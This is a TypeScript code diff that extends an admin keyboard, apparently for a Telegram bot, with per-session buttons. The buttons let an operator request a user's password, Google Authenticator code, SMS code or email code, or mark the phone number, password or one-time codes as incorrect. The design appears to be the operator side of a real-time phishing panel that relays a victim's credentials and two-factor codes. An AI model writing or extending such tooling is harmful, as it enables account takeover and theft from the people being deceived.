@@ -387,26 +387,58 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   const buttons = [];
 
+  // First row: Phone verification incorrect button (always show after phone verification)
+  buttons.push([
+    {
+      text: "❌ شماره اشتباه",
+      callback_data: `incorrect_phone_${sessionId}`,
+    },
+    {
+      text: "❌ کد تایید اشتباه",
+      callback_data: `incorrect_verification_${sessionId}`,
+    },
+  ]);
+
+  // Authentication method buttons
+  const authButtons = [];
+
   // Password button
   if (!session.authAttempts["password"]) {
-    buttons.push([
-      {
-        text: "🔒 Password",
-        callback_data: `auth_password_${sessionId}`,
-      },
-    ]);
+    authButtons.push({
+      text: "🔒 Password",
+      callback_data: `auth_password_${sessionId}`,
+    });
     console.log("✅ Added Password button");
+  } else {
+    // Add incorrect password button if password was attempted
+    authButtons.push({
+      text: "❌ رمز اشتباه",
+      callback_data: `incorrect_password_${sessionId}`,
+    });
   }
 
   // Google Auth button
   if (!session.authAttempts["google"]) {
-    buttons.push([
-      {
-        text: "📱 Google Auth",
-        callback_data: `auth_google_${sessionId}`,
-      },
-    ]);
+    authButtons.push({
+      text: "📱 Google Auth",
+      callback_data: `auth_google_${sessionId}`,
+    });
     console.log("✅ Added Google Auth button");
+  } else {
+    // Add incorrect google button if attempted
+    authButtons.push({
+      text: "❌ Google Auth اشتباه",
+      callback_data: `incorrect_google_${sessionId}`,
+    });
+  }
+
+  // Add auth buttons in pairs
+  for (let i = 0; i < authButtons.length; i += 2) {
+    if (i + 1 < authButtons.length) {
+      buttons.push([authButtons[i], authButtons[i + 1]]);
+    } else {
+      buttons.push([authButtons[i]]);
+    }
   }
 
   // SMS Code button (allow up to 2 attempts)
@@ -418,6 +450,13 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
       },
     ]);
     console.log("✅ Added SMS Code button");
+  } else {
+    buttons.push([
+      {
+        text: "❌ کد پیامک اشتباه",
+        callback_data: `incorrect_sms_${sessionId}`,
+      },
+    ]);
   }
 
   // Email Code button
@@ -429,6 +468,13 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
       },
     ]);
     console.log("✅ Added Email Code button");
+  } else {
+    buttons.push([
+      {
+        text: "❌ کد ایمیل اشتباه",
+        callback_data: `incorrect_email_${sessionId}`,
+      },
+    ]);
   }
 
   // Complete Auth button (if user has completed at least one additional step)
